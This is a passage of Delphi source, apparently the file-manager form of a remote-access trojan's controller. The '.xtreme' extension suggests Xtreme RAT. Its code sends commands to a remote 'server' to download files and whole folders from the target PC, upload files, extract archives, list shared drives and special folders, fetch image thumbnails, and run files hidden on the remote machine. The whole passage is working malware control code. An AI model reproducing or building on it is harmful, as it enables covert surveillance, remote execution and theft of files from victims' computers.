  delete(OneByOneList, 1, posex(delimitadorcomandos, OneByOneList) - 1);
  delete(OneByOneList, 1, length(delimitadorcomandos));

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

  Servidor.EnviarString(FMDOWNLOAD + '|' + RemoteFileName);

  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.Umarquivoporvez2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  begin
    if CheckDownloadList(ListView2.Items.Item[i].Caption) = false then
    TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  OneByOneList := OneByOneList + TempStr;

  RemoteFileName := Copy(OneByOneList, 1, posex(delimitadorcomandos, OneByOneList) - 1);
  delete(OneByOneList, 1, posex(delimitadorcomandos, OneByOneList) - 1);
  delete(OneByOneList, 1, length(delimitadorcomandos));

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

  Servidor.EnviarString(FMDOWNLOAD + '|' + RemoteFileName);

  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.UnRAR1Click(Sender: TObject);
var
  TempStr: string;
  DirName: string;
  Dir: string;
begin
  DirName := 'FolderName';
  if InputQuery(Traduzidos[638], Traduzidos[51] + ':', DirName) = False then exit;

  Dir := ExtractFileDir(TFileDados(ListView1.Selected.Data).FileName) + '\';
  while posex('\\', Dir) > 0 do delete(Dir, posex('\\', Dir), 1);
  DirName := Dir + DirName;

  TempStr := TFileDados(ListView1.Selected.Data).FileName + '|';

  if LowerCase(ExtractFileExt(TFileDados(ListView1.Selected.Data).FileName)) = '.rar' then
  Servidor.EnviarString(FMUNRARFILE + '|' + DirName + '|' + TempStr) else
  Servidor.EnviarString(FMUNZIPFILE + '|' + DirName + '|' + TempStr);
end;

procedure TFormFileManager.UpdateFileIcons(ListView: TListView);
var
  TFI: TempFileInfo;
  i, ExtensionIndex: integer;
  SHFileInfo :TSHFileINfo;
  TempInt: integer;
  TempFile: string;
  TempExt: shortstring;
begin
  if ExtensionList = nil then ExtensionList := TStringList.Create;

  for i := 0 to ListView.Items.Count - 1 do
  begin
    if (ListView.Items[i].SubItems.Objects[0] = nil) and
       (ListView.Items[i].SubItems.Strings[0] = '') then Continue;

    TempInt := ExtensionList.IndexOf(ListView.Items[i].SubItems[2]);
    if TempInt <> - 1 then
    TFI := TempFileInfo(ExtensionList.Objects[TempInt]) else TFI := nil;
    if TFI <> nil then ExtensionIndex := TFI.ExtensionIndex else ExtensionIndex := - 1;

    if ExtensionIndex = - 1 then
    begin
      try
        SHGetFileInfo(PChar(ListView.Items[i].SubItems[2]), FILE_ATTRIBUTE_NORMAL, SHFileInfo, SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);
        ExtensionIndex := SHFileInfo.iIcon;
        except
        ExtensionIndex := - 1;
      end;
      if ExtensionIndex > 0 then
      begin
        TempExt := GetFileTypeDescription(ListView.Items[i].SubItems[2]);
        TFI := TempFileInfo.Create;
        TFI.Extension := TempExt;
        TFI.ExtensionIndex := ExtensionIndex;
        ExtensionList.AddObject(ListView.Items[i].SubItems[2], TObject(TFI));
      end else ExtensionIndex := - 1;
    end;

    if TFI <> nil then
    begin
      ListView.Items[i].ImageIndex := TFI.ExtensionIndex;
      ListView.Items[i].SubItems[2] := TFI.Extension;
    end else
    begin
      ListView.Items[i].ImageIndex := FormMain.FileManagerUnknownIcon;
      ListView.Items[i].SubItems[2] := Traduzidos[320] + ' (' + ListView.Items[i].SubItems[2] + ')';
    end;

    if posex('H', ListView.Items[i].SubItems[1]) > 0 then ListView.Items[i].Cut := True;
  end;
end;

procedure TFormFileManager.Normal1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  for i := 0 to ListView1.Items.Count - 1 do
  if ListView1.Items.Item[i].Selected = true then
  TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorComandos;
  Servidor.EnviarString(FMEXECNORMAL + '|' + TempStr);
end;

procedure TFormFileManager.Oculto1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  for i := 0 to ListView1.Items.Count - 1 do
  if ListView1.Items.Item[i].Selected = true then
  TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorComandos;
  Servidor.EnviarString(FMEXECHIDE + '|' + TempStr);
end;

procedure TFormFileManager.Normal2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorComandos;
  Servidor.EnviarString(FMEXECNORMAL + '|' + TempStr);
end;


procedure TFormFileManager.Oculto2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorComandos;
  Servidor.EnviarString(FMEXECHIDE + '|' + TempStr);
end;

procedure TFormFileManager.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt, TempInt1, TempInt2: Int64;
  Item: TListItem;
  TempStr, TempDir, TempFile, TempStr1, tempStr2: string;
  i: integer;
  Result: TSplit;
  TamanhoTotal: int64;
  TamanhoUsado: int64;
  DriveLetter, DriveType, SistemaArquivo, VolumeName: string;
  Tn, TempNode: TTreeNode;
  Dados: TDirDados;
  Stream: TMemoryStream;
  JPG: TJpegImage;
  BMP: TBitmap;
  ImageID: integer;
  TransferInfo: pConexaoNew;
  p: pointer;
  Node: pVirtualNode;
  Transfer: TConexaoNew;
  RecDownloadAll: TRecDownloadAll;
  TempBool: boolean;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSENDFTP then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    statusbar1.Panels.Items[0].Text := traduzidos[341] + ': "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSENDFTPYES then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    statusbar1.Panels.Items[0].Text := traduzidos[340] + ': "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSENDFTPNO then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    statusbar1.Panels.Items[0].Text := traduzidos[342] + ': "' + Recebido + '"';
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMUPLOAD then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if (TransferInfo <> nil) then
        begin
          if TransferInfo^.Transfer_RemoteFileName = Recebido then
          begin
            statusbar1.Panels.Items[0].Text := traduzidos[343] + ' ' + Recebido;
            TransferInfo^.Transfer_IsDownload := False;
            TransferInfo^.MasterIdentification := 1234567890;
            TransferInfo^.UploadFile(Conaux);
            try
              TransferInfo^.Connection.Disconnect;
	          except
            end;
            sleep(100);
            Application.ProcessMessages;
            if TransferInfo^.Transfer_TransferComplete then
            begin
              statusbar1.Panels.Items[0].Text := traduzidos[344] + ' ' + TransferInfo^.Transfer_RemoteFileName;
              TabSheet1.Show;
              ComboBox1.Text := ExtractFilePath(TransferInfo^.Transfer_RemoteFileName);
              IniciarListagem(ComboBox1.Text);
              ComboBox1.SetFocus;
              ComboBox1.SelLength := Length(ComboBox1.Text);
            end else
            begin
              statusbar1.Panels.Items[0].Text := traduzidos[345] + ' ' + TransferInfo^.Transfer_RemoteFileName;
            end;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;

    end else statusbar1.Panels.Items[0].Text := traduzidos[346] + ' ' + TempStr;

	  if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMUPLOADERROR then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if (TransferInfo <> nil) then
        begin
          if pConexaoNew(VirtualStringTree1.GetNodeData(Node))^.Transfer_RemoteFileName = Recebido then
          begin
            MessageBox(Handle,
                       pwidechar(traduzidos[346] + ' ' + ExtractFileName(Recebido)),
                       pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                   MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
            VirtualStringTree1.DeleteNode(Node);
            TransferInfo^.Free;
            break;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADERROR then
  begin
    tempBool := False;
    delete(Recebido, 1, posex('|', Recebido));

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if (TransferInfo <> nil) then
        begin
          if pConexaoNew(VirtualStringTree1.GetNodeData(Node))^.Transfer_RemoteFileName = Recebido then
          begin
            tempBool := True;
            statusbar1.Panels.Items[0].Text := traduzidos[347] + ' ' + ExtractFileName(Recebido);
            VirtualStringTree1.DeleteNode(Node);
            TransferInfo^.Free;
            break;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;
    end;

    if OneByOneList <> '' then
    begin
      TempStr := Copy(OneByOneList, 1, posex(DelimitadorComandos, OneByOneList) - 1);
      Delete(OneByOneList, 1, posex(DelimitadorComandos, OneByOneList) - 1);
      Delete(OneByOneList, 1, Length(DelimitadorComandos));

      if CheckDownloadList(TempStr) = false then
      begin
        Transfer := TConexaoNew.Create(nil, nil);
        Transfer.CreateTransfer(TempStr, '', 0, 0, True, VirtualStringTree1);
        Servidor.EnviarString(FMDOWNLOAD + '|' + TempStr);
      end;
    end;

    if (PossoBaixarPasta = True) and (ListaArquivosPasta <> '') then
    begin
      TempStr := Copy(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
      Delete(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
      Delete(ListaArquivosPasta, 1, length(DelimitadorComandos));

      if CheckDownloadList(TempStr) = false then
      begin
        Transfer := TConexaoNew.Create(nil, nil);
        Transfer.CreateTransfer(TempStr, '', 0, 0, True, VirtualStringTree1);
        Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + TempStr);
      end;
    end;

    {
    if TempBool then
    MessageBox(Handle,
               pwidechar(traduzidos[347] + ' ' + ExtractFileName(Recebido)),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    }
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADFOLDERADD then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    ListaArquivosPasta := ListaArquivosPasta + Recebido;

    if ListaArquivosPasta = '' then Exit;

    TempStr := Copy(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
    Delete(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
    Delete(ListaArquivosPasta, 1, length(DelimitadorComandos));

    if CheckDownloadList(TempStr) = false then
    begin
      Transfer := TConexaoNew.Create(nil, nil);
      Transfer.CreateTransfer(TempStr, '', 0, 0, True, VirtualStringTree1);
      Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + TempStr);
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOADFOLDER then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempInt := StrToInt(Recebido); //Tamanho do arquivo

    TempDir := ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC;
    ForceDirectories(TempDir);
    Randomize;


    TempStr1 := TempDir + '\' + Replacestring(':', '', ExtractFilePath(TempStr));
    if ForceDirectories(TempStr1) then TempFile := TempStr1 + ExtractFileName(TempStr) else
    TempFile := TempDir + '\' + Inttostr(Random(9999)) + '__' + ExtractFileName(TempStr);

    tempStr2 := TempFile;
    i := 0;
    while FileExists(tempStr2) = True do
    begin
      tempStr2 := ExtractFilePath(tempStr2) + '(' + IntToStr(i) + ')_' + ExtractFileName(TempFile);
      inc(i);
    end;
    TempFile := tempStr2;

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if Assigned(TransferInfo) then
        begin
          if TransferInfo^.Transfer_RemoteFileName = TempStr then
          begin
            statusbar1.Panels.Items[0].Text := traduzidos[348] + ' ' + TempStr;
            TransferInfo^.Transfer_RemoteFileName := TempStr;
            TransferInfo^.Transfer_RemoteFileSize := TempInt;
            TransferInfo^.Transfer_LocalFileName := TempFile;
            TransferInfo^.Transfer_IsDownload := True;
            TransferInfo^.MasterIdentification := 1234567890;
            TransferInfo^.DownloadFile(ConAux);
            try
              TransferInfo^.Connection.Disconnect;
	          except
            end;
            if TransferInfo^.Transfer_TransferComplete then
            statusbar1.Panels.Items[0].Text := traduzidos[350] + ' ' + TransferInfo^.Transfer_RemoteFileName else
            statusbar1.Panels.Items[0].Text := traduzidos[351] + ' ' + TransferInfo^.Transfer_RemoteFileName;

            if (TransferInfo^.Transfer_TransferComplete) and (FormDownloadAll <> nil) then
              SendMessage(FormDownloadAll.Handle, 5560, cardinal(TransferInfo^.Transfer_RemoteFileName), 0);

            Break;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;

      if (PossoBaixarPasta = True) and (ListaArquivosPasta <> '') then
      begin
        TempStr := Copy(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
        Delete(ListaArquivosPasta, 1, posex(DelimitadorComandos, ListaArquivosPasta) - 1);
        Delete(ListaArquivosPasta, 1, length(DelimitadorComandos));

        if CheckDownloadList(TempStr) = false then
        begin
          Transfer := TConexaoNew.Create(nil, nil);
          Transfer.CreateTransfer(TempStr, '', 0, 0, True, VirtualStringTree1);
          Servidor.EnviarString(FMDOWNLOADFOLDERADD + '|' + TempStr);
        end;
      end;

      VirtualStringTree1.Refresh;
    end else
    begin
      statusbar1.Panels.Items[0].Text := traduzidos[349] + ' ' + TempStr;
      if ConAux.MasterIdentification = 1234567890 then
      try
        ConAux.Connection.Disconnect;
        except
      end;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMDOWNLOAD then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempInt := StrToInt(Recebido); //Tamanho do arquivo
    TempDir := ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC;
    ForceDirectories(TempDir);
    TempFile := TempDir + '\' + ExtractFileName(TempStr);

    tempStr2 := TempFile;
    i := 0;
    while FileExists(tempStr2) = True do
    begin
      tempStr2 := ExtractFilePath(tempStr2) + '(' + IntToStr(i) + ')_' + ExtractFileName(TempFile);
      inc(i);
    end;
    TempFile := tempStr2;

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if Assigned(TransferInfo) then
        begin
          if TransferInfo^.Transfer_RemoteFileName = TempStr then
          begin
            statusbar1.Panels.Items[0].Text := traduzidos[348] + ' ' + TempStr;
            TransferInfo^.Transfer_RemoteFileName := TempStr;
            TransferInfo^.Transfer_RemoteFileSize := TempInt;
            TransferInfo^.Transfer_LocalFileName := TempFile;
            TransferInfo^.Transfer_IsDownload := True;
            TransferInfo^.MasterIdentification := 1234567890;
            TransferInfo^.DownloadFile(ConAux);
            try
              TransferInfo^.Connection.Disconnect;
	          except
            end;
            if TransferInfo^.Transfer_TransferComplete then
            statusbar1.Panels.Items[0].Text := traduzidos[350] + ' ' + TransferInfo^.Transfer_RemoteFileName else
            statusbar1.Panels.Items[0].Text := traduzidos[351] + ' ' + TransferInfo^.Transfer_RemoteFileName;
            Break;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;

      if OneByOneList <> '' then
      begin
        TempStr := Copy(OneByOneList, 1, posex(DelimitadorComandos, OneByOneList) - 1);
        Delete(OneByOneList, 1, posex(DelimitadorComandos, OneByOneList) - 1);
        Delete(OneByOneList, 1, Length(DelimitadorComandos));

        if CheckDownloadList(TempStr) = false then
        begin
          Transfer := TConexaoNew.Create(nil, nil);
          Transfer.CreateTransfer(TempStr, '', 0, 0, True, VirtualStringTree1);
          Servidor.EnviarString(FMDOWNLOAD + '|' + TempStr);
        end;
      end;

    end else
    begin
      statusbar1.Panels.Items[0].Text := traduzidos[349] + ' ' + TempStr;
      if ConAux.MasterIdentification = 1234567890 then
      try
        ConAux.Connection.Disconnect;
        except
      end;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMRESUMEDOWNLOAD then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, posex(DelimitadorComandos, Recebido) - 1);
    delete(Recebido, 1, length(DelimitadorComandos));

    TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1)); //Tamanho do arquivo
    delete(Recebido, 1, posex('|', Recebido));
    TempInt1 := StrToInt(Recebido);

    TempDir := ExtractFilePath(ParamStr(0)) + 'Downloads\' + NomePC;
    ForceDirectories(TempDir);
    TempFile := TempDir + '\' + ExtractFileName(TempStr);

    tempStr2 := TempFile;
    i := 0;
    while (FileExists(tempStr2 + '.xtreme') = False) and (i < 100) do
    begin
      tempStr2 := ExtractFilePath(tempStr2) + '(' + IntToStr(i) + ')_' + ExtractFileName(TempFile);
      sleep(10);
      inc(i);
    end;
    TempFile := tempStr2;

    if FileExists(TempFile + '.xtreme') = False then
    begin
      ConAux.Connection.Disconnect;
      exit;
    end;

    if VirtualStringTree1.TotalCount > 0 then
    begin
      Node := VirtualStringTree1.GetFirst;
      while Assigned(Node) do
      begin
        TransferInfo := VirtualStringTree1.GetNodeData(Node);
        if (TransferInfo <> nil) then
        begin
          if TransferInfo^.Transfer_RemoteFileName = TempStr then
          begin
            statusbar1.Panels.Items[0].Text := traduzidos[348] + ' ' + TempStr;
            TransferInfo^.MasterIdentification := 1234567890;
            TransferInfo^.Transfer_RemoteFileName := TempStr;
            TransferInfo^.Transfer_RemoteFileSize := TempInt;
            TransferInfo^.Transfer_LocalFileName := TempFile;
            TransferInfo^.Transfer_LocalFileSize := TempInt1;
            TransferInfo^.Transfer_IsDownload := True;
            TransferInfo^.MasterIdentification := 1234567890;
            TransferInfo^.DownloadFile(ConAux);
            try
              TransferInfo^.Connection.Disconnect;
	          except
            end;
            if TransferInfo^.Transfer_TransferComplete then
            statusbar1.Panels.Items[0].Text := traduzidos[350] + ' ' + TransferInfo^.Transfer_RemoteFileName else
            statusbar1.Panels.Items[0].Text := traduzidos[351] + ' ' + TransferInfo^.Transfer_RemoteFileName;
          end;
        end;
        Node := VirtualStringTree1.GetNext(Node);
      end;

    end else
    begin
      statusbar1.Panels.Items[0].Text := traduzidos[349] + ' ' + TempStr;
      if ConAux.MasterIdentification = 1234567890 then
      try
        ConAux.Connection.Disconnect;
        except
      end;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS_SEARCH then
  begin
    if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;

    while FMTHUMBS_SEARCH_STARTED = true do Application.ProcessMessages;
    FMTHUMBS_SEARCH_STARTED := true;

    statusbar1.Panels.Items[0].Text := traduzidos[352];

    delete(Recebido, 1, posex('|', Recebido));
    Tempint := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    ListView2.Items.BeginUpdate;

    ImageListThumbs2.Width := TempInt;
    ImageListThumbs2.Height := TempInt;
    ImageListThumbs2.Clear;

    ListView2.LargeImages := ImageListThumbs2;
    ListView2.SmallImages := ImageListThumbs2;

    for i := 0 to ListView2.Items.Count - 1 do ListView2.Items.Item[i].ImageIndex := - 1;

    while recebido <> '' do
    begin
      TempStr := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);  // FileName
      delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(delimitadorComandos));

      TempStr1 := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);  // FileImage
      delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(delimitadorComandos));

      Stream := TMemoryStream.Create;
      Stream.WriteBuffer(TempStr1[1], length(TempStr1) * 2);
      Stream.Position := 0;
      JPG := TJpegImage.Create;
      try
        JPG.LoadFromStream(Stream);
        except
        JPG.Free;
        Stream.Free;
        continue;
      end;
      Stream.Free;
      BMP := TBitmap.Create;
      BMP.Width := JPG.Width;
      BMP.Height := JPG.Height;
      BMP.Canvas.Draw(0, 0, JPG);
      JPG.Free;
      ImageID := ImageListThumbs2.Add(BMP, nil);
      BMP.Free;

      for i := 0 to ListView2.Items.Count - 1 do
      begin
        if ListView2.Items.Item[i].Caption = TempStr then
        begin
          ListView2.Items.Item[i].Cut := False;
          ListView2.Items.Item[i].ImageIndex := ImageID;
        end;
      end;
    end;

    for i := ListView2.Items.Count - 1 downto 0 do
    begin
      TempStr := ListView2.Items.Item[i].Caption;
      if (IsImageFile(TempStr) = false) or (ListView2.Items.Item[i].ImageIndex = - 1) then ListView2.Items.Item[i].Delete;
    end;

    if FMTHUMBS_SEARCH_STARTED = true then ListView2.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[353] + ' ' + traduzidos[354] + ': (' + inttostr(ListView2.Items.Count) + ')';

    FMTHUMBS_SEARCH_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS2 then
  begin
    p := VirtualAlloc(nil, Length(Recebido) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    CopyMemory(p, @Recebido[1], Length(Recebido) * 2);
    PostMessage(handle, WM_GETIMAGE, Length(Recebido) * 2, integer(p));
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMTHUMBS then
  begin
    if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;

    while FMTHUMBS_STARTED = true do Application.ProcessMessages;
    FMTHUMBS_STARTED := true;

    statusbar1.Panels.Items[0].Text := traduzidos[352];

    delete(Recebido, 1, posex('|', Recebido));
    Tempint := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));

    ListView1.Items.BeginUpdate;

    ImageListThumbs.Width := TempInt;
    ImageListThumbs.Height := TempInt;
    ImageListThumbs.Clear;

    ListView1.LargeImages := ImageListThumbs;
    ListView1.SmallImages := ImageListThumbs;

    for i := 0 to ListView1.Items.Count - 1 do ListView1.Items.Item[i].ImageIndex := - 1;

    while (recebido <> '') and (FMTHUMBS_STARTED = true) do
    begin
      TempStr := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);  // FileName
      delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(delimitadorComandos));

      TempStr1 := Copy(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);  // FileImage
      delete(Recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(Recebido, 1, length(delimitadorComandos));

      Stream := TMemoryStream.Create;
      Stream.WriteBuffer(TempStr1[1], length(TempStr1) * 2);
      Stream.Position := 0;
      JPG := TJpegImage.Create;
      try
        JPG.LoadFromStream(Stream);
        except
        JPG.Free;
        Stream.Free;
        continue;
      end;
      Stream.Free;
      BMP := TBitmap.Create;
      BMP.Width := JPG.Width;
      BMP.Height := JPG.Height;
      BMP.Canvas.Draw(0, 0, JPG);
      JPG.Free;
      ImageID := ImageListThumbs.Add(BMP, nil);
      BMP.Free;

      for i := 0 to ListView1.Items.Count - 1 do
      begin
        if TFileDados(ListView1.Items.Item[i].Data).FileName = TempStr then
        begin
          ListView1.Items.Item[i].Cut := False;
          ListView1.Items.Item[i].ImageIndex := ImageID;
        end;
      end;
    end;

    for i := ListView1.Items.Count - 1 downto 0 do
    begin
      TempStr := TFileDados(ListView1.Items.Item[i].Data).FileName;
      if (IsImageFile(TempStr) = false) or (ListView1.Items.Item[i].ImageIndex = - 1) then ListView1.Items.Item[i].Delete;
    end;

    if FMTHUMBS_STARTED = true then ListView1.Items.EndUpdate;
    statusbar1.Panels.Items[0].Text := traduzidos[353] + ' ' + traduzidos[354] + ': (' + inttostr(ListView1.Items.Count) + ')';
    FMTHUMBS_STARTED := false;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSHAREDDRIVELIST then
  begin
    if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;

    while TreeView1.Enabled = False do
    begin
      sleep(100);
      Application.ProcessMessages;
    end;
    if SharedDrive <> nil then
    begin
      SharedDrive.Delete;
      SharedDrive := nil;
    end;

    delete(recebido, 1, posex('|', recebido));
    while recebido <> '' do
    begin
      TempStr := Copy(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));

      TempStr1 := copy(TempStr, 1, posex('|', TempStr) - 1);
      delete(TempStr, 1, posex('|', Tempstr));
      if copy(TempStr, 1, posex('|', TempStr) - 1) = '8' then
      begin
        if length(TempStr1) > 0 then
        begin
          if SharedDrive = nil then
          begin
            SharedDrive := TreeView1.Items.Add(nil, traduzidos[308]);
            SharedDrive.ImageIndex := FormMain.FileManagerIcon[9];
            SharedDrive.SelectedIndex := FormMain.FileManagerIcon[9];
          end;

          if TempStr1[length(TempStr1)] <> '\' then TempStr1 := TempStr1 + '\';
          if Copy(TempStr1, 1, 2) = '\\' then
          TempNode := Treeview1.Items.AddChild(SharedDrive, TempStr1);
          TempNode.ImageIndex := FormMain.FileManagerIcon[10];
          TempNode.SelectedIndex := FormMain.FileManagerIcon[10];
        end;
      end;
    end;
    if SharedDrive <> nil then
    if SharedDrive.Count > 0 then
    begin
      SharedDrive.Expand(false);
      statusbar1.Panels.Items[0].Text := traduzidos[355];
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSPECIALFOLDERS then
  begin
    delete(recebido, 1, posex('|', recebido));
    while recebido <> '' do
    begin
      TempNode := nil;
      TempStr := copy(recebido, 1, posex('|', Recebido) - 1);
      delete(recebido, 1,  posex('|', Recebido));

      TempStr1 := copy(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, posex(delimitadorComandos, Recebido) - 1);
      delete(recebido, 1, length(delimitadorComandos));

      if (TempStr = 'DESKTOP') and (TempStr1 <> '') then
      begin
        TempNode := TreeView1.Items.Add(nil, TempStr1);
        TempNode.ImageIndex := FormMain.FileManagerSpecialIcons[14];
        TempNode.SelectedIndex := TempNode.ImageIndex;
      end;
      if (TempStr = 'PERSONAL') and (TempStr1 <> '') then
      begin
        TempNode := TreeView1.Items.Add(nil, TempStr1);
        TempNode.ImageIndex := FormMain.FileManagerSpecialIcons[5];
        TempNode.SelectedIndex := TempNode.ImageIndex;
      end;
      if (TempStr = 'FAVORITES') and (TempStr1 <> '') then
      begin
        TempNode := TreeView1.Items.Add(nil, TempStr1);
        TempNode.ImageIndex := FormMain.FileManagerSpecialIcons[6];
        TempNode.SelectedIndex := TempNode.ImageIndex;
      end;
      if (TempStr = 'RECENT') and (TempStr1 <> '') then
      begin
        TempNode := TreeView1.Items.Add(nil, TempStr1);
        TempNode.ImageIndex := FormMain.FileManagerSpecialIcons[8];
        TempNode.SelectedIndex := TempNode.ImageIndex;
      end;
      TreeView1.Refresh;
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMSPECIALFOLDERS2 then
  begin
    delete(recebido, 1, posex('|', recebido));

    while TreeView1.enabled = false do
    begin
      sleep(100);
      Application.ProcessMessages;
    end;

    if recebido <> '' then
    begin
      if SpecialNode <> nil then
      begin
        SpecialNode.Delete;
        SpecialNode := nil;
      end;

      SpecialNode := TreeView1.Items.Add(nil, Traduzidos[309]);
      SpecialNode.ImageIndex := FormMain.FileManagerSpecialIcons[25];
      SpecialNode.SelectedIndex := SpecialNode.ImageIndex;
    end;

    while recebido <> '' do
    begin
      TempNode := nil;
      TempInt := StrToInt(copy(recebido, 1, posex('|', Recebido) - 1));
      delete(recebido, 1,  posex('|', Recebido));

